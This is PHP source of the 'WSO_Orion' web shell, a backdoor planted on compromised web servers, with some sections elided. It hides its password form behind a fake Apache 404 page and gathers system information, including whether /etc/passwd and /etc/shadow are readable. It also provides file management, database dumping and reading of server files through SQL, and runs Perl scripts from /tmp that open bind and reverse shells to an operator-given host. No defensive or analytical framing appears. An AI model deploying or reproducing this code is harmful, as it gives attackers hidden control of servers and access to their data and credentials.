<?php
$auth_pass = "4b55203af528b575dc02fde13c0631dd";
$color = "#FFFFFF";
...
@define('Orion_VERSION', 'Orion');

if(get_magic_quotes_gpc()) {
	function Orionstripslashes($array) {
		return is_array($array) ? array_map('Orionstripslashes', $array) : stripslashes($array);
	}
	$_POST = Orionstripslashes($_POST);
}
...
<address>Apache/2.2.22 (Unix) mod_ssl/2.2.22 OpenSSL/1.0.0-fips mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 Server at Port 80</address>
    <style>
        input { margin:0;background-color:#fff;border:1px solid #fff; }<!-- 404 -->
    </style>
    <pre align=center>
    <form method=post>
...
function OrionHeader() {
	if(empty($_POST['charset']))
		$_POST['charset'] = $GLOBALS['default_charset'];
	global $color;
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . " WSO_Orion" ."</title>
<style>
body {background-color:#000;color:#959595;} 
body,td,th{ font: 10pt Lucida,Verdana;margin:0;vertical-align:top; } 
...
.ml1{ border:1px solid #FFFFFF;padding:5px;margin:0;overflow: auto; } 
.bigarea{ width:100%;height:250px; } 
input, textarea, select{ margin:0;color:#00ff00;background-color:#5e5e5e;border:1px solid $color; font: 10pt Monospace,'Courier New'; } 
form{ margin:0px; } 
...
<input type=hidden name=charset>
	...
	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' . ($GLOBALS['os'] == 'win'?'<br>Drives:':'') . '</span></td>'
       . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' </nobr><br>' . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' )<br>' . @phpversion() . ' <span>Safe mode:</span> ' . ($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#25ff00><b>OFF</b></font>')
       . ' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a> <span>Datetime:</span> ' . date('Y-m-d H:i:s') . '<br>' . OrionViewSize($totalSpace) . ' <span>Free:</span> ' . OrionViewSize($freeSpace) . ' ('. (int) ($freeSpace/$totalSpace*100) . '%)<br>' . $cwd_links . ' '. OrionPermsColor($GLOBALS['cwd']) . ' <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')">[ home ]</a><br>' . $drives . '</td>'
       . '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">' . $opt_charsets . '</optgroup></select><br><span>Server IP:</span><br>' . @$_SERVER["SERVER_ADDR"] . '<br><span>Client IP:</span><br>' . $_SERVER['REMOTE_ADDR'] . '</nobr></td></tr></table>'
       . '<table style="border-top:1px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menu . '</tr></table><div style="margin:5">';
}

function OrionFooter() {
	$is_writable = is_writable($GLOBALS['cwd'])?" <font color='#25ff00'>(Writeable)</font>":" <font color=red>(Not writable)</font>";
    echo "

</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:1px solid #333;border-bottom:1px solid #333;'>
	<tr>
...
function OrionPermsColor($f) {
	if (!@is_readable($f))
		return '<font color=#FF0000>' . OrionPerms(@fileperms($f)) . '</font>';
	elseif (!@is_writable($f))
		return '<font color=white>' . OrionPerms(@fileperms($f)) . '</font>';
	else
		return '<font color=#25ff00>' . OrionPerms(@fileperms($f)) . '</font>';
}
...
function OrionWhich($p) {
	$path = OrionEx('which ' . $p);
	if(!empty($path))
		return $path;
	return false;
}
...
function actionSecInfo() {
	...
	OrionSecParam('Server software', @getenv('SERVER_SOFTWARE'));
    if(function_exists('apache_get_modules'))
        OrionSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
	OrionSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none');
	OrionSecParam('Open base dir', @ini_get('open_basedir'));
	OrionSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
	OrionSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
	OrionSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
	$temp=array();
	...
	if(function_exists('oci_connect'))
		$temp[] = "Oracle";
	OrionSecParam('Supported databases', implode(', ', $temp));
	echo '<br>';

	if($GLOBALS['os'] == 'nix') {
		OrionSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no');
		OrionSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"etc\", \"shadow\")'>[view]</a>":'no');
		OrionSecParam('OS version', @file_get_contents('/proc/version'));
		OrionSecParam('Distr name', @file_get_contents('/etc/issue.net'));
		if(!$GLOBALS['safe_mode']) {
			...
			foreach ($userful as $item)
				if(OrionWhich($item))
                    $temp[] = $item;
			OrionSecParam('Userful', implode(', ',$temp));
			$temp=array();
			foreach ($danger as $item)
				if(OrionWhich($item))
                    $temp[] = $item;
			OrionSecParam('Danger', implode(', ',$temp));
			$temp=array();
			foreach ($downloaders as $item)
				if(OrionWhich($item))
                    $temp[] = $item;
			OrionSecParam('Downloaders', implode(', ',$temp));
			echo '<br/>';
            OrionSecParam('HDD space', OrionEx('df -h'));
			OrionSecParam('Hosts', @file_get_contents('/etc/hosts'));
		}
	} else {
		OrionSecParam('OS Version',OrionEx('ver'));
		OrionSecParam('Account Settings',OrionEx('net accounts'));
		OrionSecParam('User Accounts',OrionEx('net user'));
	}
	echo '</div>';
	OrionFooter();
}
...
function actionFilesMan() {
		...
		switch($_POST['p1']) {
			...
			case 'paste':
				if($_SESSION['act'] == 'copy') {
                    ...
                    OrionEx('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_SESSION['f']));
                    chdir($GLOBALS['cwd']);
				}
				unset($_SESSION['f']);
				break;
	...
	if($dirContent === false) {	echo 'Can\'t open this folder!';OrionFooter(); return; }
	global $sort;
	$sort = array('name', 1);
	if(!empty($_POST['p1'])) {
...
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
	...
	for($i=0;$i<$n;$i++) {
		...
		$tmp = array('name' => $dirContent[$i],
					 ...
					 'perms' => OrionPermsColor($GLOBALS['cwd'] . $dirContent[$i]),
	...
	$GLOBALS['sort'] = $sort;
	function OrionCmp($a, $b) {
		if($GLOBALS['sort'][0] != 'size')
			return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
		else
			return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
	}
	usort($files, "OrionCmp");
	usort($dirs, "OrionCmp");
	$files = array_merge($dirs, $files);
	$l = 0;
	foreach($files as $f) {
		echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');" title=' . $f['link'] . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>').'</a></td><td>'.(($f['type']=='file')?OrionViewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
    ...
    if(!empty($_SESSION['act']) && @count($_SESSION['f']) && (($_SESSION['act'] == 'zip') || ($_SESSION['act'] == 'tar')))
        echo "file name: <input type=text name=p2 value='Orion_" . date("Ymd_His") . "." . ($_SESSION['act'] == 'zip'?'zip':'tar.gz') . "'>&nbsp;";
...
function actionStringTools() {
	...
	function OrionRecursiveGlob($path) {
		if(substr($path, -1) != '/')
			$path.='/';
...
function actionFilesTools() {
	...
	echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?OrionViewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.OrionPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
	...
	class DbClass {
		...
		function loadFile($str) {
			switch($this->type)	{
				...
				break;
				case 'pgsql':
					$this->query("CREATE TABLE Orion2(file text);COPY Orion2 FROM '".addslashes($str)."';select file from Orion2;");
					$r=array();
					while($i=$this->fetch())
						$r[] = $i['file'];
					$this->query('drop table Orion2');
	...
	if(isset($db) && $db->link){
		echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
			if(!empty($_POST['sql_base'])){
				$db->selectdb($_POST['sql_base']);
				echo "<tr><td width=1 style='border-top:3px solid #666;'><span>Tables:</span><br><br>";
				...
				echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:3px solid #666;'>";
				if(@$_POST['p1'] == 'select') {
					$_POST['p1'] = 'query';
...
function actionNetwork() {
	...
	if(isset($_POST['p1'])) {
		...
		if($_POST['p1'] == 'bpp') {
			...
			$out = OrionEx("perl /tmp/bp.pl ".$_POST['p2']." 1>/dev/null 2>&1 &");
			echo "<pre class=ml1>$out\n".OrionEx("ps aux | grep bp.pl")."</pre>";
            unlink("/tmp/bp.pl");
		}
		if($_POST['p1'] == 'bcp') {
			cf("/tmp/bc.pl",$back_connect_p);
			$out = OrionEx("perl /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." 1>/dev/null 2>&1 &");
			echo "<pre class=ml1>$out\n".OrionEx("ps aux | grep bc.pl")."</pre>";
            unlink("/tmp/bc.pl");
		}
	}
	echo '</div>';
